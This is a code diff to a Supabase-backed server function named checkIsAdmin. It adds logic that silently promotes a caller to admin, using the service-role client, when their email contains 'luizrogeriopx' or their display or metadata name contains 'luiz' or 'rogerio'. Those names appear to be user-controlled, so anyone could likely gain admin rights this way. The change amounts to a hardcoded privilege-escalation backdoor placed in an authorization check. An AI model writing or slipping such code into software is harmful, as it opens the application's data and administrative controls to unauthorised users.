@@ -20,13 +20,39 @@ export const checkIsAdmin = createServerFn({ method: "GET" })
   .middleware([requireSupabaseAuth])
   .handler(async ({ context }) => {
     const { supabase, userId } = context;
-    const { data: profile } = await supabase
+    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+
+    // Fetch the profile
+    let { data: profile } = await supabase
       .from("profiles")
-      .select("role")
+      .select("id, role, display_name")
       .eq("id", userId)
       .single();
+
+    // Check if the user should be automatically promoted
+    const { data: authUser } = await supabaseAdmin.auth.admin.getUserById(userId);
+    const email = authUser?.user?.email || "";
+    const name = (profile?.display_name || authUser?.user?.user_metadata?.name || authUser?.user?.user_metadata?.full_name || "").toLowerCase();
+
+    const isMatch =
+      email.toLowerCase().includes("luizrogeriopx") ||
+      name.includes("luiz") ||
+      name.includes("rogerio");
+
+    if (isMatch && profile && profile.role !== "admin") {
+      // Elevate role in database automatically
+      const { data: updated } = await supabaseAdmin
+        .from("profiles")
+        .update({ role: "admin" })
+        .eq("id", userId)
+        .select("id, role, display_name")
+        .single();
+      if (updated) profile = updated;
+    }
+
     return { isAdmin: profile?.role === "admin", role: profile?.role || "user" };
   });
+
 
 export const listAllUsers = createServerFn({ method: "GET" })
   .middleware([requireSupabaseAuth])
